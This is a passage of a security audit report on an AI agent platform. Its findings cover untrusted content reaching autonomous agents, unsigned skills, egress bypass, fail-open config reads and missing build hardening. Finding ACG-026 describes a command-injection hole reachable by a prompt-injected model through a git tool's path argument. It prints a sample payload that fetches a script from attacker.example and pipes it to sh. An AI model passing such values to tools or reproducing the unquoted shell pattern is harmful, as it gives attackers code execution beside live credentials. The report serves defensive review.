  symlink/hardlink chains, race swaps, cross-workspace paths, overlong/truncated names, and support
  asset escapes while allowing a normal in-workspace skill.

### ACG-014 — Autonomous document execution lacks complete integrity gating

- **Control objective:** untrusted retrieved, uploaded, watched, or stored content cannot become
  agent authority or trigger effects without deterministic classification and an enforceable
  approval/containment decision outside the model.
- **Evidence:** `src/server/trigger_scheduler.c:552-554,664` defaults a trigger rule with omitted
  mode to `autonomous`; generated configuration documents `wfe_live_forge_enabled` as default-on.
  A whole-tree production search finds `integrity_gate_check()` at exactly one caller,
  `src/modules/learning/learning_router.c:448-472`. Watch-directory materialization, KB/document
  ingest, memory writes, web attachments, and recalled-content injection do not invoke it. The
  existing `governance-policy-surface-and-posture.md` records the same unscreened path from watched
  Markdown to an autonomous forge pipeline.
- **Impact:** a malicious or compromised repository, connector, retrieved record, or document can
  supply instruction-like content to an autonomous agent that has tool and forge authority. Tool
  guardrails and merge rails constrain some effects, but the content trust transition itself is
  neither classified nor parked for human review.
- **Required change / owner:** Agent Security must deliver the existing governance-profile and
  integrity-ingress work: a standard profile, integrity decisions at every materialization boundary,
  quarantine/interactive downgrade for non-user content, an immediate autonomy kill switch, and
  approval for externalization or over-threshold blast radius.
- **Acceptance evidence:** hostile fixtures at every ingress must produce a durable verdict and
  park/refuse before any tool, delegate, provider, forge, memory, or document effect. Obfuscated and
  encoded variants, quoted security documentation, and benign controls need precision gates.
- **Remediation verification (2026-08-27):** `integrity_ingress_decide` is the shared materialization
  boundary used by learning, ingest, memory, recall and attachment/document paths, with durable
  verdicts and hostile/benign fixtures. `wfe_autonomy_killed()` supplies the immediate fail-closed
  autonomy stop before autonomous workflow effects. The focused ingress, integrity, workflow and
  server route suites pass.

### ACG-015 — Enforcement evidence is incomplete by construction

- **Control objective:** every policy decision and privileged effect enters one mechanically complete
  durable event path with actor, subject, tenant, policy revision, verdict, effect/result, and loss
  status.
- **Evidence:** the verified inventory in `governance-attestable-enforcement.md` identifies live
  enforcers that do not reach the WORM chain: attention/session-worktree guard, gateway policy,
  memory interception, integrity gate, native gate, vault writes/capability grants, trigger fires,
  and forge operations. The pending `event-bus-enforcement-and-attestation-residual.md` says the core
  tap is not yet the structural observer and that bypass paths are not forbidden. Current lint proves
  declared event-kind durability, not complete mutation/enforcer coverage.
- **Impact:** a valid chain can verify perfectly while omitting important denials, allows, credential
  use, policy changes, and autonomous effects. An auditor cannot use surviving rows to prove
  completeness or reconstruct actor-to-effect causality.
- **Compensating controls:** subsystem JSONL/lifecycle logs and many event-bus sinks preserve useful
  operational evidence. They have different durability, identity, retention, and tamper properties
  and no common completeness counter.
- **Required change / owner:** Audit Architecture must make the action/event path itself the required
  enforcement seam, not a side effect: typed schemas, synchronous policy verdict before action-class
  delivery, transaction/outbox linkage to effects, source/effect counters, and CI that plants a
  bypass in every governed domain and requires detection.
- **Acceptance evidence:** the evidence bundle must reconcile attempted decisions, committed
  decisions, effects, failures, drops, and terminal outcomes with zero unexplained gaps under crash,
  queue-full, reload, storage-loss, and process-restart injection.

### ACG-016 — Executable agent artifacts have no integrity or approval boundary

- **Control objective:** plugins, skills, workflow definitions, and agent templates execute only
  from an approved immutable digest and their provenance/approval is auditable.
- **Evidence:** `src/modules/skills/skill.c:106-143` gives project files precedence;
  `skill.c:172-203` loads their current bytes without signature, digest, or load-time lint; and
  `skill.c:1800-1828` appends them under `ACTIVE SKILL` to the model's system prompt. Project skills
  may carry trigger metadata. The pending `governance-agent-identity-and-artifact-trust.md` records
  that plugins, skills, ensemble templates, and saved workflows have no signature, checksum, or
  pinning.
- **Impact:** a changed checkout, dependency, compromised contributor, or repository-controlled skill
  can silently replace authoritative instructions for agents holding credentials and autonomous tool
  rights. Git review alone does not bind the bytes actually loaded at runtime or detect post-checkout
  change.
- **Compensating controls:** skill creation/edit APIs lint content, tool execution still passes
  server guardrails, and repository review can detect committed changes. Direct checkout artifacts
  bypass creation lint and none of these controls establishes artifact identity at execution.
- **Required change / owner:** Artifact Security must implement canonical file manifests, approved
  digests, operator re-approval on change, signatures in hardened mode, immutable workflow-version
  binding, load verdicts in WORM, and revocation. Project artifacts start untrusted and cannot
  self-trigger before approval.
- **Acceptance evidence:** modify, replace, symlink, race-swap, downgrade, or partially update each
  artifact class and prove it refuses before parse/injection/execution; verify approval identity,
  exact digest, dependency closure, revocation, and offline signature validation.
- **Remediation verification (2026-08-27):** the approved-digest/signature boundary now covers project
  skills, saved workflows, custom workflow blocks, roundtable/ensemble templates and MCP plugin
  manifests. `src/tests/test_artifact_trust.c` and the class-specific workflow, roundtable and MCP
  tests reject missing approval, altered bytes and identity substitution before execution.

### ACG-017 — Agent and hook accountability is not identity-grade

- **Evidence:** `guardrails_action_audit.c` records the governed actor as the coarse role
  `primary|delegate`. The server falls back to a shared service principal for delegates and
  autonomous work. Hook paths consume the unauthenticated `AIMEE_HOOK_CLIENT` environment value in
  `src/cmd_hooks.c`, `src/cli_attention_guard.c`, and memory redirection paths. The pending identity
  proposal records these limitations and no session token binding is implemented.
- **Impact:** events cannot reliably answer which delegate acted, who delegated authority, or which
  authenticated client owns an intercepted memory scope. A local process can spoof another hook
  client's label. This weakens attribution, revocation, least privilege, and forensic linkage.
- **Required change / owner:** Identity must mint per-agent/per-run principals, propagate bounded
  on-behalf-of chains server-side, use them for vault decisions, and replace the environment label
  with a session-scoped authenticated hook token.
- **Remediation verification (2026-08-27):** session start now mints a CSPRNG-backed token bound to
  session id, verified principal and harness client; subsequent hook operations require that token,
  and session end revokes it. `src/tests/test_hook_session_token.c` and server dispatch tests cover
  cross-session, cross-client, cross-principal, replay-after-rotation and post-revocation denial.

### ACG-018 — Egress policy and audit can be silently bypassed

- **Evidence:** `docs/ARCHITECTURE.md:96-104` permits modules to call outward until a future egress
  owner exists but requires a bus log. `module-egress-single-point.md` is pending and explicitly says
  omission remains silent. Current direct clients include memory embedding, MCP SSE, git forge,
  roundtable artifact retrieval, and browser/control services.
- **Impact:** a new or compromised module can send data or credentials to an unapproved destination
  without a governance record, and each network-capable module expands credential blast radius.
- **Required change / owner:** Runtime Security must first require an authorize/audit decision for
  every target, then migrate bytes/streaming/protocols to a single egress service and run other
  module processes without network. Destination policy must bind resolved IP, scheme, port, purpose,
  principal, credential handle, request digest, redirects, byte budget, and policy revision.
- **Remediation verification (2026-08-27):** the separately registered Go egress module now owns
  the actual HTTP request/response and MCP SSE connect/send/receive bytes for memory embedding, Git
  forge calls, roundtable artifacts and dynamic MCP clients. Policy binds bus principal, purpose,
  method/path, request digest, credential-presence, resolved IPs, redirects, limits and revision;
  every transport stage is ledger-class while raw credential/external-content capture is suppressed.
  `scripts/check-module-egress.py` inventories the four clients, rejects direct socket primitives and
  a planted bypass, and ratchets the runtime guard. The Linux launcher installs a synchronized
  seccomp filter that returns `EPERM` for IPv4/IPv6 socket creation in ordinary Go process modules
  while preserving Unix-domain bus sockets; focused subprocess and full Go/native suites pass.
  Forge now relays only a 30-second X25519/AES-GCM envelope bound to the Git caller, egress key,
  host, operation and repository; a C-to-Go fixture pins the wire grammar. MCP provisioning relays
  only `mcp:<caller-ref>` and egress derives the one matching Vault name, while a helper rejects any
  parent other than the installed egress executable. The egress process disables dumpability before
  serving. This closes credential custody and outbound transport for ordinary Go process modules.
  Closure is not claimed for trusted C server/KB protocols, separately declared store/proxy network
  owners, or production activation evidence.

### ACG-019 — Sensitive change approval is not mechanically separated

- **Evidence:** `OWNERS.md` assigns logical modules and says sensitive changes need boundary review,
  but it maps no accountable people or teams. `.github/CODEOWNERS` protects only seven release-policy
  files and does not cover auth, audit, vault, DB schemas, deployment, agents, or the ownership file
  itself. `.github/workflows/main-merge-approval.yml:10-14` documents one named reviewer and permits
  self-review. Live repository rules and environment settings are not source-verifiable.
- **Impact:** the repository cannot prove that security-sensitive code received qualified,
  independent review or that control owners approved exceptions. A single identity can author and
  approve a release-control change, defeating separation of duties for assurance purposes.
- **Required change / owner:** Engineering Governance must map every sensitive boundary to a team
  with primary/backup people, require independent non-author approval, protect CODEOWNERS/OWNERS and
  workflow files themselves, export ruleset evidence, and use expiring signed risk exceptions.
- **Live read-only verification (2026-08-27):** GitHub exposed one active `main` ruleset, whose only
  rule requires deployment through `main-merge-approval`. Both that environment and `release`
  resolve to the same single admin reviewer, so the observed state does not establish independent
  approval. The available token received `403` for `testing` branch protection, and no offline
  evidence-signing key was present; a complete, signed export therefore could not be produced.

### ACG-020 — Compliance readiness lacks the required evidence system

- **Evidence status:** this is a source-evidence gap, not a claim that the operating organization has
  no controls. The tracked tree has a technical `docs/SECURITY.md`, but no vulnerability-disclosure
  policy/secure intake, incident-response plan, data inventory/classification and processing-purpose
  register, unified retention/deletion/legal-hold matrix, control-owner/evidence register, formal risk
  register, supplier/subprocessor inventory, or periodic access-review evidence. `docs/modules/audit.md`
  expressly says retention, deletion schedules, archival, replication, legal hold, and guaranteed
  immutable storage are not present. Deployment docs tell the operator to back up and test restore,
  but do not define RPO/RTO or produce recurring restore evidence.
- **Impact:** Aimee cannot substantiate SOC 2/ISO control operation, privacy lifecycle promises, or a
  complete incident response from repository evidence. Product controls may exist yet remain
  unauditable, and operators have no authoritative map from data category to purpose, location,
  access, export, retention, deletion, backup, or processor.
- **Required change / owner:** Security & Compliance must create a control matrix with named owner,
  scope, implementation, evidence artifact, cadence, reviewer, exceptions, and retention; add a
  secure disclosure/intake policy, incident playbooks and exercises, data/processor inventory,
  deletion and legal-hold policy, risk register, access reviews, backup/restore objectives, and
  evidence-bundle generation. Legal counsel decides regulatory applicability.

### ACG-021 — Audit capability depends on the build system

- **Evidence:** `docs/modules/audit.md` records that Make builds all four audit sources while CMake's
  core contains only `audit_action.c` and `audit_ledger.c`, omitting the SQLite WORM store and shared
  chain implementations from those products. Module ownership describes canonical sources but does
  not require behavior parity across the actual artifacts.
- **Impact:** an operator can build a valid Aimee product whose audit commands, durability, or
  verification properties differ from another supported build without an explicit product identity
  or compliance qualification. Tests against one build do not prove the other.
- **Required change / owner:** Build Engineering and Audit must either establish exact behavior
  parity or designate one supported production build and fail unsupported profiles when WORM is
  required. The artifact manifest must enumerate compiled security capabilities.

### ACG-022 — Hostile MCP SSE responses are not resource bounded

- **Evidence:** `server-go/modules/mcp/sse.go:171` uses `bufio.Reader.ReadString('\n')`, which can
  allocate an arbitrarily long line; successive `data:` lines accumulate in an unbounded
  `bytes.Buffer` until a blank line. `Send` at lines 216-225 drains the POST response with unlimited
  `io.Copy` using an HTTP client with no request timeout because it also owns the long-lived stream.
  Aimee's threat model explicitly treats MCP packages and remote networks as hostile.
- **Impact:** a configured or compromised MCP peer can exhaust the MCP module's memory with one event
  or hold handler goroutines indefinitely, degrading or repeatedly crashing MCP availability.
- **Required change / owner:** MCP Runtime must impose per-line, per-event, frame, header, response,
  connection, idle, and total byte/time budgets; use a dedicated bounded client/context for POST;
  cancel and discard the transport on violation; and feed failures into restart/circuit-breaker
  policy without an infinite restart loop.

### ACG-023 — Gateway pairing is predictable and non-transactional

- **Evidence:** `src/gateway/gateway_pairing.c:145-163` derives a six-digit code from current time
  and a process-local counter and does not check uniqueness. `src/posix/cmd_infra.c:136-140` separately
  seeds `rand()` with time and PID. The gateway and CLI use different process-local mutexes, then
  rewrite `gateway-pairs.json` through `fopen("w")`; there is no shared file lock, temporary file,
  fsync, atomic rename, or compare-and-swap. Approval selects the first matching code and prints only
  `approved`.
- **Impact:** restarts/concurrency can duplicate codes, approve the wrong pending identity, lose a
  concurrent revoke/issue, or leave partial/empty authorization state. Prediction alone does not
  grant access because approval is local, which limits severity, but identity confusion at the
  authorization ceremony is a material control defect.
- **Required change / owner:** Gateway Identity must use rejection-sampled CSPRNG codes with a unique
  pending-code constraint, show and require confirmation of platform/user identity, and store state
  transactionally under a shared lock or single server owner with atomic durable replacement and an
  audit row for issue/approve/revoke.

### ACG-024 — The nightly fuzz gate cannot build

- **Evidence:** executing `make fuzz` on the audited clean baseline stops with `No rule to make
  target 'tests/fuzz_memory_search.c'`. `src/Makefile:2491,2530-2545,2599,2638` still declares,
  builds, and runs that missing source. `.github/workflows/fuzz-nightly.yml:27-31,64-67` explicitly
  builds and runs the same target, so the scheduled job cannot reach any later corpus or extended
  fuzz work. The workflow's extended loop also omits several newer fuzz targets present in
  `FUZZ_TARGETS` and appends `|| true` to each target invocation, which masks a nonzero/crash result.
- **Impact:** the repository presents a nightly security-testing control that deterministically
  fails at build time and therefore supplies no continuing fuzz evidence. Parser, ACL, management
  token, and message-frame regressions may persist despite the workflow's presence.
- **Required change / owner:** Security Testing must restore or remove the stale target, derive the
  workflow matrix from the Make target rather than duplicate it, treat build/setup errors as distinct
  failures, retain corpus/crash artifacts, and publish per-target execution time and iteration counts.
  Add a required presubmit smoke build so a broken nightly cannot remain unnoticed.
- **Acceptance evidence:** a clean runner must build and seed every canonical fuzz target, execute an
  extended run for each, fail on crashes/timeouts/sanitizer findings (not mask them with `|| true`),
  and upload reproducible inputs and toolchain metadata.

### ACG-025 — Published security guarantees are not release-qualified

- **Evidence:** `docs/SECURITY.md` labels several statements as guarantees: remote routes require an
  authenticated principal, audit records retain originating principals across delegates/workflows,
  assigned-workspace path checks prevent symlink or alternate-root escape, the audit store detects
  modification, and provider egress has policy/rate control. ACG-001 demonstrates a shipped remote
  KB owner surface without authentication; ACG-017 demonstrates coarse/generic and spoofable
  principal attribution; ACG-013 demonstrates a reachable alternate-root/symlink read; ACG-003
  demonstrates mutable evidence fields outside the verified hash; and ACG-018 demonstrates direct
  egress whose required policy/audit record can be omitted. The document does not scope these claims
  to particular artifacts, build profiles, enabled settings, or test evidence.
- **Impact:** operators and downstream assurance reviewers can rely on a security property that is
  false for a shipped topology or reachable operation. This converts implementation drift into
  governance, contractual, and incident-classification risk and makes control effectiveness
  impossible to assess from the stated model.
- **Required change / owner:** Product Security and Documentation must maintain a machine-readable
  claim registry. Every guarantee must name applicable artifact/profile, default configuration,
  threat boundary, enforcement owner, negative test, evidence query and known exception. Generate
  the public security model from release-qualified claims; describe incomplete work as a target or
  limitation, never a guarantee.
- **Acceptance evidence:** CI must instantiate every shipped topology and map each published
  guarantee to passing negative tests and an evidence artifact. A missing mapping, disabled default,
  contradictory configuration, or expired exception blocks publication and release.

- **Second-pass addendum — the understatement direction.** ACG-025 catalogues where
  `docs/SECURITY.md` claims *more* than the code delivers. The second pass found the opposite as
  well, and a claim registry must capture both or it will institutionalise the understatement. The
  trust-boundary table reads "delegate → host | **process or container** isolation, resource limits,
  explicit mounts and egress"; both alternatives are stale.
  `workspace_turn_bind_container` (`src/modules/workspace/workspace_turn.c:520-560`) has removed the
  in-process path entirely — "There is no second execution model to fall back to, so every failure
  below refuses (-1)" — and `delegate_sandbox_require_isolation` is documented in
  `docs/gen/configuration.md:54` as a deprecated, ignored key. The shipped posture is
  *unconditional container isolation with no host fallback*, materially stronger than the document
  claims. An understated control is a lost assurance credit: a reviewer reading the current text
  would score this boundary lower than the code earns. The registry schema should therefore record,
  per claim, both `enforcement_owner` and `stronger_than_stated`, so drift is detected in either
  direction by the same CI check.

<a id="acg-026"></a>
### ACG-026 — `shell_escape()` does not quote, and ~20 call sites interpolate it unquoted

- **Control objective:** an untrusted tool argument must not reach a command interpreter, and a
  model must not obtain execution inside the process that custodies credentials.

- **Evidence.** `shell_escape()` (`src/util.c:956`) escapes `'` as `'\''` and returns the body
  **without surrounding quotes**:

  ```c
  char *shell_escape(const char *raw)      /* src/util.c:956 */
  {
     ...
     for (size_t i = 0; i < len; i++)
        if (raw[i] == '\'') { esc[j++]='\''; esc[j++]='\\'; esc[j++]='\''; esc[j++]='\''; }
        else                  esc[j++] = raw[i];
     ...
  }
  ```

  Its implicit contract is therefore *"safe only when the caller writes `'%s'`"*. That contract is
  stated nowhere, and it is violated at roughly twenty interpolation sites. An input containing no
  `'` — `` /tmp; id; # `` — passes through completely unchanged.

  The reachable sink is the git MCP repository resolver:

  ```c
  static int mcp_git_candidate_root(const char *candidate, ...)  /* mcp_git_query.c:347 */
  {
     char *esc = shell_escape(candidate);
     snprintf(git_cmd, sizeof(git_cmd),
              "git -C %s rev-parse --show-toplevel 2>/dev/null", esc);   /* bare %s */
     char *out = mcp_git_run(git_cmd, &rc);
  }
  ```

  `candidate` is a **model-supplied MCP tool argument**: `args["path"]`, added as the first and
  authoritative candidate at `src/modules/git/mcp_git_query.c:982`, with `args["cwd"]` as a second
  path at `:1015`. `mcp_git_run()` executes through `run_cmd*` → `popen()` (`src/util.c:690`),
  i.e. `/bin/sh -c`.

- **Failure condition.** A model — including one steered by prompt injection carried in retrieved
  text, a repository file, or an MCP tool result, all three of which `docs/SECURITY.md` declares
  hostile — calls any aimee git MCP tool with:

  ```json
  {"path": "/tmp; curl -s https://attacker.example/x.sh | sh; #"}
  ```

  The resolver builds `git -C /tmp; curl -s https://attacker.example/x.sh | sh; # rev-parse
  --show-toplevel` and hands it to `popen()`. Arbitrary code executes on aimee-server. No
  operator misconfiguration is required; this is the default tool path.

- **Impact.** Three multipliers make this Critical rather than High:

  1. **The injected shell inherits a live forge credential.** `mcp_git_run()` deliberately runs
     git on the server with `GH_TOKEN` and the `GIT_ASKPASS` shim injected into the child
     environment (`mcp_git_query.c:100-121`, via `git_cred_inject_build_env_for_repo`). This
     defeats the stated guarantee that "agent credentials are resolved inside the server and are
     not returned to workflows or delegates" — the model never *receives* the credential, it
     achieves execution in the process that holds it, which is strictly worse.
  2. **It lands on the trusted side of the sandbox boundary.** The comment at
     `mcp_git_query.c:69-81` documents that git tooling is routed to aimee-server *specifically*
     to keep it out of the `--network none`, no-credential delegate sandbox. The injection
     therefore executes exactly where the sandbox exists to prevent execution, with network
     access.
  3. **On the documented managed deployment it reaches host root.**
     `compose.server-managed.yaml:208` bind-mounts `/var/run/docker.sock`, and
     `deploy/container/server-entrypoint.sh:492-504` grants the `aimee` service user that
     socket's group. `docs/SECURITY.md` accepts "anyone who controls that server can control the
     Docker host" as a deployment trade-off — but that sentence assumes control of the server is
     itself gated. ACG-026 removes the gate: one tool argument from a prompt-injected model
     suffices. This also compounds ACG-001: an unauthenticated KB owner surface and a
     model-reachable RCE on the server are reachable from different directions into the same
     deployment.

- **Other unquoted sites confirmed** (same helper, same shell backing):

  | File | Lines | Format |
  | --- | --- | --- |
  | `src/modules/git/mcp_git_query.c` | 356, plus the `rev-parse` / `--git-common-dir` helpers | `git -C %s …` |
  | `src/index.c` | 287, 295, 301, 488, 498, 506, 658, 703, 722 | `git -C %s …`, `find %s …` |
  | `src/modules/db2/c/canonical_index.c` | 711, 719, 725, 892, 900, 906, 1033, 1072, 1087 | `git -C %s …`, `find %s …` |
  | `src/util.c` | 715, 739 | `cd %s && %s` |
  | `src/server/cli_session_pty.c` | 209 | `tmux attach -t %s` |

- **Compensating controls and residual risk.** None on this path. Roughly 90 of the 110
  `shell_escape` call sites *do* write `'%s'` and are correct — `git_forge_vault.c:96`,
  `mcp_git_branch.c` throughout, `server_pipeline.c`. This is the shape of a latent trap rather
  than an absence of care: the helper is right most of the time, which is precisely why the
  exceptions survived review.

- **Required change / owner.** Platform Security and Tooling:

  1. **Required for the sink:** stop building shell strings for git.
     `safe_exec_capture_cwd_env_timeout()` already exists in `src/util.c` and takes an `argv`
     vector; route `mcp_git_run` and the `index.c` / `canonical_index.c` git calls through it, so
     no shell is involved and no quoting contract can be violated.
  2. For sites that must remain shell-backed, make `shell_escape()` emit a **fully quoted** token
     — returning `'…'` including delimiters — and rename it `shell_quote()`, so every call site
     is revisited by the compiler rather than by reviewer attention. Update the ~90 correct sites
     to drop their now-doubled quotes in the same change.
  3. Add a `shell-quote-check` target beside the existing `git-cred-centralized-check`, wired
     into required CI.
  4. Independently of quoting, validate `args["path"]` and `args["cwd"]` against the assigned
     workspace root before use. `docs/SECURITY.md` claims "path checks use canonical workspace
     roots"; this resolver performs no such check. The machinery already exists —
     `workspace_turn_workspace_authorized` does exactly this correctly for the sandbox path.

- **Acceptance tests.**
  - `shell_quote("a'b;c")` round-trips through `/bin/sh -c` as the single literal argument
    `a'b;c`.
  - A git MCP tool called with `{"path": "/tmp; touch /tmp/aimee-injection-canary; #"}` leaves no
    canary file and returns a refusal.
  - `make -C src shell-quote-check` reports zero bare-`%s` interpolations of an escaped value.
  - `mcp_git_candidate_root` refuses a `path` outside every registered workspace root.

- **Rollout constraint.** Change 1 must not wait for change 2. The rename is the durable fix; the
  sink is the live one, and it is release-blocking on its own.

<a id="acg-027"></a>
### ACG-027 — hardening depends on toolchain defaults, and broad sanitizer/SAST gates are absent

- **Control objective:** exploitable memory-safety defects are detected before release, and those
  that ship are made materially harder to exploit.

- **Evidence (a) — hardening.** The single `C_FLAGS` line that builds all ~872k lines of
  first-party C (`src/Makefile:110`):

  ```make
  C_FLAGS = -Os -flto -ffunction-sections -fdata-sections -Wl,--gc-sections -s \
            -Wall -Wextra -Werror -Wno-unused-parameter -Wno-format-truncation \
            -Wno-unused-result -MMD -MP …
  ```

  No checked-in release profile explicitly requires `-D_FORTIFY_SOURCE=3`,
  `-fstack-protector-strong`, `-fstack-clash-protection`, `-fPIE -pie`, full RELRO
  (`-Wl,-z,relro,-z,now`), `-Wl,-z,noexecstack`, `-Wformat-security`, or
  `-fcf-protection`. A direct build on the audit host demonstrates why the distinction matters:
  the host toolchain supplies PIE, a non-executable stack and partial RELRO by default, but the
  resulting stripped `aimee-server` has no `BIND_NOW`, stack-canary or fortified-libc imports.
  Another supported compiler/distribution can silently produce a weaker artifact because the
  repository neither requests nor verifies these properties.

  Two flags actively work against this audit:

  - `-Wno-format-truncation` suppresses exactly the diagnostic class that matters given how much
    of this codebase builds shell commands and paths with `snprintf` into fixed buffers. A
    silently truncated quoted shell argument is a security-relevant failure — see ACG-026 — and
    the compiler is being told not to mention it. `index.c:240` and `code_collect.c:240` show the
    codebase *does* check truncation by hand where someone remembered to.
  - `-s` strips symbols from shipped binaries, degrading the crash forensics that
    `src/shutdown_forensics.c` exists to perform.

- **Evidence (b) — detection.** The repository has a standalone witness-gate TSan Make target and
  a second bus-arena TSan script, but neither appears in the required workflows. There is no broad
  ASan/UBSan build of the native unit suite or fuzz targets. `src/Makefile` defines
  `static-analysis`, `cppcheck` and `clang-tidy` targets; none appears in any of the 18 workflows.
  `fuzz-nightly.yml` intends to run randomized inputs, which is useful when operational, but it
  neither adds ASan/UBSan nor preserves nonzero target results (and ACG-024 shows the workflow
  currently fails before the fuzz run). A secret scanner is also absent on every PR.

- **Impact.** ~872k lines of C parse hostile input without a repository-enforced stack-canary,
  full-RELRO or fortified-libc contract and without a broad memory-error detector in the required
  test or fuzz pipeline. The resulting exploit resistance varies with the build host, and many
  memory-safety defects can escape the present gates. Note the
  asymmetry with the product's own promise: `docs/SECURITY.md` states "the OSV gate checks known
  vulnerabilities and can block an unhealthy package" for *MCP packages the user installs*.

- **Scope note.** The dependency-scanning and artifact-provenance halves of the CI gap are
  **deferred to ACG-004 and ACG-005** and are not re-filed here. This finding covers binary
  hardening, sanitizers, SAST and secret scanning only.

- **Required change / owner.** Build & Release:

  1. Add a hardened release profile: `-D_FORTIFY_SOURCE=3 -fstack-protector-strong
     -fstack-clash-protection -fPIE -pie -Wl,-z,relro,-z,now -Wl,-z,noexecstack
     -Wformat-security -fcf-protection=full`. Measure the size delta against the `-Os` goal.
  2. Remove `-Wno-format-truncation` and fix the resulting sites; where truncation is genuinely
     intended, say so with an explicit length check as `index.c:240` already does.
  3. Ship debug symbols as a separate artifact rather than `-s`.
  4. Add a required CI job running the existing unit-test shards under
     `-fsanitize=address,undefined`, and build the fuzz targets with sanitizers. This is the
     highest-yield item in this finding.
  5. Wire `static-analysis` / `cppcheck` / `clang-tidy` into the `lint` job.
  6. Add a secret scanner on every PR.

- **Acceptance tests.**
  - `checksec` on the shipped `aimee-server` reports RELRO=full, PIE, stack canaries, NX and
    fortified functions present.
  - A required CI job named `sanitizers` runs the unit-test shards green under ASan+UBSan.
  - `make -C src fuzz` builds with `-fsanitize=address,undefined,fuzzer`.
  - A PR containing a test credential fails CI.

<a id="acg-028"></a>
### ACG-028 — `guardrails_validate_file_path` is a deny-list, not workspace confinement, and ignores its own bounds parameter

- **Control objective:** a tool write cannot escape the assigned workspace authority, and a
  validation helper's signature does not misrepresent what it enforces.

- **Cross-reference.** ACG-013 (`skill.show` cross-workspace reads) is a *reachable exploit* of
  this same class, found independently by the primary pass on the read side. This finding is the
  *shared helper* on the write side. They should be remediated under one invariant — resolve
  beneath an authorized root with no symlink following, using directory FDs and
  `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)` — rather than patched separately. That two
  independent passes each found a distinct instance is the strongest available evidence that the
  path-authorization layer needs one owner and one primitive, not per-call-site fixes.

- **Evidence.** `docs/SECURITY.md` states: "Path checks use canonical workspace roots. A symlink,
  `..`, alternate spelling, or client-local path must not escape the assigned authority."

  `guardrails_validate_file_path` (`src/modules/guardrails/guardrails.c:619`) — the function
  thirteen tool implementations call to validate a path — does not check workspace roots at all.
  It rejects literal `..` spellings, `realpath`s the input, and tests the result against a
  **substring deny-list** of sensitive paths. A path that resolves anywhere on the host outside
  that list passes. Three specific defects:

  1. **The bounds parameter is a lie.** The signature is
     `(const char *path, char *resolved_buf, size_t resolved_len)`, and `resolved_len` is **never
     referenced in the body**. `realpath(path, resolved_buf)` writes up to `PATH_MAX`. Today every
     caller passes `char resolved[MAX_PATH_LEN]` and `MAX_PATH_LEN == 4096 == PATH_MAX` on Linux,
     so nothing overflows — but the function accepts a size it does not honour. The first caller
     to pass a smaller buffer, or the first port to a platform where `PATH_MAX > MAX_PATH_LEN`,
     gets a stack overflow with no diagnostic. This interacts directly with ACG-027: without
     `-fstack-protector-strong`, that overflow is unmitigated.
  2. **For a file that does not yet exist, the final path component is dropped from the check.**
     When `realpath` fails, the function truncates to the parent directory, resolves *that* into
     `resolved_buf`, and deny-list-checks the parent string. A deny-list entry naming a filename
     rather than a directory therefore does not apply to creating that file.
  3. **The trailing comment claims a check that is not made.** Lines 654-656 read "Check for
     symlink escape: resolved path should not point into a sensitive directory even if the
     original path looked benign. Compare against the same deny list (already done above on the
     resolved path)." A deny-list on the resolved path is not a symlink-escape check; escape
     *from the workspace root* is not tested anywhere in this function.

- **Compensating controls and residual risk.** Real workspace confinement lives elsewhere and is
  stronger. `agent_tools_session_isolation_blocks` (`src/server/agent_tools.c:219`) normalises the
  path, requires it under a managed worktree, defaults to 1, and re-defaults to 1 on config-read
  failure. `classify_path` (`guardrails.c:451`) does check the basename and is called from
  `guardrails_orchestrator.c:1742`, covering tools routed through `pre_tool_check`. Tools calling
  `guardrails_validate_file_path` directly are not covered by defect 2. Residual risk is therefore
  defence-in-depth erosion rather than a demonstrated escape — but the weaker of two layers is
  exactly where defence in depth is decided.

- **Required change / owner.** Tooling & Guardrails:
  1. Honour `resolved_len`: resolve into a local `PATH_MAX` buffer, bounds-check the copy out, and
     return an error on overflow.
  2. Deny-list the basename as well as the resolved parent on the not-yet-exists path, or have
     this function call `classify_path` so there is one sensitivity decision rather than two.
  3. Either add a workspace-root containment test here, or rename the function to
     `guardrails_check_sensitive_path` and correct the trailing comment, so no future caller
     mistakes it for the confinement boundary.

- **Acceptance tests.**
  - A caller passing a 256-byte `resolved_buf` with a 3000-byte resolved path receives an error,
    not a smash.
  - Creating a non-existent `.env` in a permitted directory is denied by the same code path that
    denies overwriting an existing one.

<a id="acg-029"></a>
### ACG-029 — generated config accessors cannot distinguish "off" from "config authority unreachable"

- **Control objective:** a security control's failure mode is its safe state, and one setting has
  one default.

- **Evidence.** Every generated boolean accessor across
  `src/config_client_accessors_0.c` … `_7.c` (~380 of them) has this shape:

  ```c
  int config_require_session_worktree(void)      /* config_client_accessors_3.c:54 */
  {
     double value = 0;
     (void)config_client_read_number("require_session_worktree", &value);
     return (int)value;
  }
  ```

  The read's return value is discarded. "Explicitly false", "never set", and "the config authority
  is down / the transport failed" are indistinguishable, and all resolve to the permissive value
  for a flag whose safe state is on.

- **Failure condition.** This is established as live rather than theoretical by the codebase
  itself. `src/server/agent_tools.c:223-228` bypasses the generated accessor specifically to avoid
  it, with a comment naming the failure exactly:

  > Fail closed if the independently running config authority is unavailable. Its generated
  > convenience accessor returns zero for both explicit false and transport failure, which would
  > silently disable isolation.

  The session-isolation control was rescued by hand at one call site. The generator that produced
  the trap was not changed, and ~380 accessors still carry it — among them
  `config_integrity_enabled` (the anti-injection gate), `config_cross_verify` and
  `config_roundtable_replay_verify_enabled`. As a direct consequence the two accessors for
  `require_session_worktree` now disagree by construction: the generated one defaults to 0, while
  the client-side attention guard (`src/cli_attention_guard.c:572`) defaults to 1.

- **Impact.** A transient config-authority outage silently downgrades enforcement posture across
  an unknown subset of controls, with no diagnostic and no audit record of the downgrade. This is
  the same class of defect as ACG-002 and ACG-006: a failure that is indistinguishable from a
  normal, permissive result.

- **Required change / owner.** Config & Governance:
  1. Change the generator to emit a failure-aware form — `int config_x(int default_on_failure)`,
     or a paired `config_x_read(int *out)` returning a status — and make security-relevant flags
     pass their safe default explicitly.
  2. Until then, add a `config-failopen-check` target enumerating the security-relevant keys and
     asserting each is read through a fail-closed call site rather than the generated convenience
     accessor.
  3. Delete the divergent `config_require_session_worktree` / `config_set_require_session_worktree`
     pair, or point it at the fail-closed reader, so one setting does not have two accessors with
     opposite defaults.

- **Acceptance tests.**
  - With the config authority stopped, `agent_tools_session_isolation_blocks` and
    `config_integrity_enabled` both report their *safe* state, not their zero state.
  - `make -C src config-failopen-check` passes, and fails on a reintroduced permissive read.

<a id="acg-030"></a>
### ACG-030 — CSPRNG failure fails open to a constant, colliding identifier

- **Control objective:** identifiers that key session isolation, artifact custody and audit
  attribution are unique, and randomness failure is never silently absorbed.

